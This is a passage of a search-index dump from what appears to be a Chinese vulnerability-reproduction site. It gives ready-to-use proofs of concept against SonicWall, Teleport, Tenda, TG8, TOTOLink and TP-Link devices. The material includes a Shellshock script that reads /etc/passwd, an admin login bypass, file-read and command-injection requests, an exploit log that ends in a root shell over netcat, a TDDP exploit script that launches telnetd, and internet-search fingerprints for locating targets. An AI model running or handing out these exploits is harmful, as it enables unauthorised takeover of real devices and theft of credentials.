POC_2(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, cmd) ","date":"0001-01-01","objectID":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Teleport堡垒机 do-login 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Teleport堡垒机存在任意用户登录漏洞，攻击者通过构造特殊的请求包可以登录堡垒机获取其他系统权限 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Teleport Version \u003c= 20220817 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TELEPORT堡垒机\" ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC， captcha参数为验证码 POST /auth/do-login args={\"type\":2,\"username\":\"admin\",\"password\":null,\"captcha\":\"ykex\",\"oath\":\"\",\"remember\":false} code 返回 0 即为成功，再访问 /dashboard 获取管理员权限 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Teleport堡垒机 get-file 后台任意文件读取漏洞 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者利用任意用户登录漏洞后可以获取后台权限，再进一步利用任意文件读取获取服务器上的敏感文件 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Teleport Version \u003c= 20220817 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TELEPORT堡垒机\" ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 登录后使用POC验证 /audit/get-file?f=/etc/passwd\u0026rid=1\u0026type=rdp\u0026act=read\u0026offset=0 ","date":"0001-01-01","objectID":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-get-file-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Tenda 11N无线路由器 Cookie 越权访问漏洞 ","date":"0001-01-01","objectID":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Tenda 11N无线路由器由于只验证Cookie，导致任意用户伪造Cookie即可进入后台 ","date":"0001-01-01","objectID":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Tenda 11N无线路由器 ","date":"0001-01-01","objectID":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TENDA-11N无线路由器\" ","date":"0001-01-01","objectID":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 添加Cookie, 访问 index.asp 进入后台 admin:language=cn ","date":"0001-01-01","objectID":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/tenda-11n%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞 ","date":"0001-01-01","objectID":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Tenda 企业级路由器 RouterCfm.cfg 配置文件可在未授权的情况下被读取，导致账号密码等敏感信息泄漏 ","date":"0001-01-01","objectID":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Tenda 企业级路由器 ","date":"0001-01-01","objectID":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"Tenda | Login\" \u0026\u0026 country=\"CN\" ","date":"0001-01-01","objectID":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 访问路径 后台账号密码位于参数 sys.userpass base64解密后的字符 ","date":"0001-01-01","objectID":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/tenda-w15e%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8-routercfm.cfg-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"TG8 防火墙 RCE及密码泄漏漏洞 ","date":"0001-01-01","objectID":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 TG8防火墙中存在两个漏洞，远程用户可以以用户身份执行命令而无需通过设备进行身份验证。第二个漏洞允许在不经过身份验证的情况下公开现有用户的密码。 参考链接： https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/ ","date":"0001-01-01","objectID":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"RCE poc： POST http://\u003cserver\u003e/admin/runphpcmd.php HTTP/1.1 Host: Server User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 68 Connection: keep-alive syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+\u003cPayload\u003e++local 执行whoami： syscmd=sudo+/home/TG8/v3/syscmd/check_gui_login.sh+;whoami;++local ","date":"0001-01-01","objectID":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:1","tags":null,"title":"","uri":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"密码泄露 /data/目录下储存了登录过用户的凭据，无需登录即可访问此目录下的文件。 例如： http://\u003cserver\u003e/data/w-341.tg http://\u003cserver\u003e/data/w-342.tg http://\u003cserver\u003e/data/r-341.tg http://\u003cserver\u003e/data/r-342.tg ","date":"0001-01-01","objectID":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:2","tags":null,"title":"","uri":"/tg8-%E9%98%B2%E7%81%AB%E5%A2%99-rce%E5%8F%8A%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084 ","date":"0001-01-01","objectID":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/:0:0","tags":null,"title":"","uri":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/"},{"categories":null,"content":"漏洞描述 TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限 ","date":"0001-01-01","objectID":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/:1:0","tags":null,"title":"","uri":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/"},{"categories":null,"content":"漏洞影响 TOTOLink 多个设备 ","date":"0001-01-01","objectID":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/:2:0","tags":null,"title":"","uri":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/"},{"categories":null,"content":"网络测绘 \"totolink\" ","date":"0001-01-01","objectID":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/:3:0","tags":null,"title":"","uri":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/"},{"categories":null,"content":"漏洞复现 下载路由器固件 使用binwalk分解固件 查看分解出来的文件 使用qemu搭建路由器 #set network sudo brctl addbr virbr2 sudo ifconfig virbr2 192.168.6.1/24 up sudo tunctl -t tap2 sudo ifconfig tap2 192.168.6.11/24 up sudo brctl addif virbr2 tap2 qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \"root=/dev/sda1\" -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic 创建后在qemu里执行命令启动路由器 ifconfig eth0 192.168.6.11 up scp -r squashfs-root/ root@192.168.6.11:/root/ chroot ./squashfs-root/ /bin/sh touch /var/run/lighttpd.pid ./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib 注意 lighttpd.conf 文件需要修改 server.pid-file 参数 启动后访问路由器页面 我们找到需要分析的文件目录 squashfs-root/web_cste/cgi-bin 分析 cgi文件 downloadFile.cgi 我们注意到其中的system执行命令 pcVar1 = getenv(\"QUERY_STRING\"); memset(acStack1424,0,0x200); memset(acStack912,0,0x200); sprintf(acStack1424,\"echo QUERY_STRING:%s \u003e/tmp/download\",pcVar1); system(acStack1424); 其中 getenv 从请求Url中获取参数,传参给pcVar1，再通过下面的sprintf 赋值给 acStack1424 使用 system函数 进行命令执行 我们构造请求包控制 QUERY_STRING 参数来进行恶意命令执行 /cgi-bin/downloadFlile.cgi?payload=`ls\u003e../cmd.txt` ","date":"0001-01-01","objectID":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/:4:0","tags":null,"title":"","uri":"/totolink-%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87-download.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25084/"},{"categories":null,"content":"TP-Link AC1750 预认证远程代码执行漏洞CVE-2021-27246 ","date":"0001-01-01","objectID":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/:0:0","tags":null,"title":"","uri":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/"},{"categories":null,"content":"漏洞描述 在TP-Link AC1750的tdpServer守护程序中存在漏洞，没有检查json数据的大小，导致了缓冲区溢出，通过缓冲区溢出，可以导致代码执行。 参考阅读： https://www.synacktiv.com/publications/pwn2own-tokyo-2020-defeating-the-tp-link-ac1750.html ","date":"0001-01-01","objectID":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/:1:0","tags":null,"title":"","uri":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/"},{"categories":null,"content":"网络测绘 app=\"TP_LINK-AC1750\" ","date":"0001-01-01","objectID":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/:2:0","tags":null,"title":"","uri":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/"},{"categories":null,"content":"漏洞复现 poc：https://github.com/synacktiv/CVE-2021-27246_Pwn2Own2020 $ bash exploit.sh [+] Launching web server for distribution of pwn.sh Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... INFO:tdpwn:Associating 49 onemesh clients... INFO:tdpwn:Done! And wait for 80 seconds... 80 seconds left... 70 seconds left... 60 seconds left... 50 seconds left... 40 seconds left... 30 seconds left... 20 seconds left... 10 seconds left... [+] Trying to exploit the tddp injection INFO:tdp:Preparing tddpv1_configset payload INFO:tdp:Sending payload [+] Trying the root shell (Low probability of success...) nc -v 192.168.0.1 12345 nc: connect to 192.168.0.1 port 12345 (tcp) failed: Connection refused [ ] If shell hasn't succeed, don't worry, we retry INFO:tdpwn:Associating 49 onemesh clients... INFO:tdpwn:Done! And wait for 80 seconds... 80 seconds left... 70 seconds left... 60 seconds left... 50 seconds left... 40 seconds left... 30 seconds left... 20 seconds left... 10 seconds left... [+] Trying to exploit the tddp injection INFO:tdp:Preparing tddpv1_configset payload INFO:tdp:Sending payload 192.168.0.1 - - [30/Nov/2020 12:10:59] \"GET /pwn.sh HTTP/1.1\" 200 - [+] Trying the root shell (High probability of success...) nc -v 192.168.0.1 12345 Connection to 192.168.0.1 12345 port [tcp/*] succeeded! uname -a Linux ArcherA7v5 3.3.8 #1 Mon Sep 14 19:52:46 CST 2020 mips GNU/Linux id uid=0(root) gid=0(root) ^C[-] Stopping Webserver, now Terminated ","date":"0001-01-01","objectID":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/:3:0","tags":null,"title":"","uri":"/tp-link-ac1750-%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-27246/"},{"categories":null,"content":"TP-Link SR20 远程命令执行 ","date":"0001-01-01","objectID":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。 ","date":"0001-01-01","objectID":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 TP-Link SR20 ","date":"0001-01-01","objectID":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\"% 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(( '', port_receive)) # Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) packet = packet + b\"/testfile;arbitrary\" print(packet) sock_send.sendto(packet, ( \"192.168.0.1\", port_send)) sock_send.close() response, addr = sock_receive.recvfrom( 1024) r = response.encode( 'hex') print(r) ","date":"0001-01-01","objectID":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/tp-link-sr20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"TP-Link TL-WR841N 远程代码执行漏洞 CVE-2020-35576 ","date":"0001-01-01","objectID":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/:0:0","tags":null,"title":"","uri":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/"},{"categories":null,"content":"漏洞描述 通过该漏洞，经过身份验证的攻击者可以在TP-Link TL-WR841N系统上执行任意命令。 参考链接： https://isopach.dev/CVE-2020-35576/ https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-35576 